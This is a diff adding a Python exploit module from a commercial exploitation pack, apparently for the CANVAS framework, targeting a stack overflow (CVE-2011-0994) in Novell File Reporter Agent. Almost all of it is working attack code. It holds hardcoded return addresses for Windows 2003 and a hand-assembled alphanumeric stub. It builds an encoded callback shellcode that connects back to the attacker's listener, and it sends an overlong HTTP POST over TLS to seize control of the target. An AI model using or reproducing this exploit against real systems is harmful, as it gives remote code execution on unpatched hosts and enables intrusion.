@@ -1,0 +1,200 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+from libs.tlslite.api import *
+
+# GUI info
+NAME = "Novell File Reporter Agent Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Novell File Reporter Agent"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "Novell"
+DOCUMENTATION["Repeatability"] = "One time"
+DOCUMENTATION["Date public"] = "2011.04.04"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-116/"
+DOCUMENTATION["Versions Affected"] = "Novell File Reporter < 1.0.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2011-0994"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0994"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2003 US (No NX)", 0x6d583f3b, 0x6d5a553f, 0x00527d3f],  # jmp esp | add esp,18 @ dbghelp.dll | add esp,438 @ libeay32.dll
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 3037        
+        self.version = 0
+        self.searchbadstring = "\x00\x0a\x0d"
+        self.badstring = self.searchbadstring
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+      	      	      
+        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)
+
+        encoder         = alphanumeric.AlphaNum()
+        totopc          = encoder.seh_pc()
+        getpc           = encoder.get_pc(reg='ecx')
+        
+        payload         = encoder.encode(self.shellcode)
+        self.shellcode  = totopc + getpc + payload         
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))                
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+         
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self.host, self.port))
+	             
+                 
+        settings = HandshakeSettings() 
+        settings.minKeySize = 512                	
+        ssl_sock = TLSConnection(s)        
+        ssl_sock.handshakeClientCert(settings=settings)
+        ssl_sock.write(sploitstring)        
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):							
+    	os_name, addr1, addr2, addr3 = targets[self.version]
+        
+        # Ret addresses     	    	    	    	
+      	ret1 = struct.pack("<L", addr1)    	    	    
+        ret2 = struct.pack("<L", addr2)
+        ret3 = struct.pack("<L", addr3)
+        
+        # ASCII code
+        """
+        00B3FF8C   54               PUSH ESP
+        00B3FF8D   58               POP EAX
+        00B3FF8E   68 7E7E7E7E      PUSH 7E7E7E7E
+        00B3FF93   5F               POP EDI
+        00B3FF94   3178 24          XOR DWORD PTR DS:[EAX+24],EDI
+        00B3FF97   68 6A655264      PUSH 6452656A
+        00B3FF9C   5F               POP EDI
+        00B3FF9D   3178 25          XOR DWORD PTR DS:[EAX+25],EDI
+        00B3FFA0   2D 55555555      SUB EAX,55555555
+        00B3FFA5   2D 55555555      SUB EAX,55555555
+        00B3FFAA   2D 6E555555      SUB EAX,5555556E
+        00B3FFAF   42               INC EDX
+        00B3FFB0   3F               AAS
+        00B3FFB1   55               PUSH EBP
+        00B3FFB2   5A               POP EDX
+        00B3FFB3   6D               INS DWORD PTR ES:[EDI],DX                
+        00B3FFB4   25 505E6824      AND EAX,24685E50
+        00B3FFB9   24 24            AND AL,24
+        00B3FFBB   24 58            AND AL,58
+        00B3FFBD   2D 7D7D7D7D      SUB EAX,7D7D7D7D
+        00B3FFC2   3146 60          XOR DWORD PTR DS:[ESI+60],EAX
+        00B3FFC5   54               PUSH ESP
+        00B3FFC6   58               POP EAX
+        00B3FFC7   56               PUSH ESI
+        00B3FFC8   5C               POP ESP
+        """
+        code1 = "\x54\x58" + "\x68\x7e\x7e\x7e\x7e" + "\x5f" + "\x31\x78\x24" + "\x68\x6a\x65\x52\x64" + "\x5f" + "\x31\x78\x25" + "\x2d\x55\x55\x55\x55" + "\x2d\x55\x55\x55\x55" + "\x2d\x6e\x55\x55\x55"  
+        code2 = "\x50\x5e" + "\x68\x24\x24\x24\x24" + "\x58" + "\x2d\x7d\x7d\x7d\x7d" + "\x31\x46\x60" + "\x54\x58" + "\x56\x5c"
+          	    	    	    	    	   	
+        data = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<NAME>" + "A"*12 + ret1 + code1 + "A"*(36-len(code1)) + ret2 + "\x25" + code2 + "A"*11 + "\x64"*(32-len(code2)) + ret3[:-1] + "</NAME>"
+              
+        payload = "\x40" + "A"*1000
+        payload = payload[:10] + self.shellcode + payload[10 + len(self.shellcode):]
+                
+    	buff = "POST " + payload + "HTTP/1.1\r\n"
+    	buff += "Host: " + self.host + "\r\n"    
+    	buff += "Content-type: text/xml\r\n"
+    	buff += "Content-Length: " + str(len(data)) + "\r\n"
+    	buff += "\r\n"
+    	buff += data
+						    	    	    		    	
+    	sploitstring = buff
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
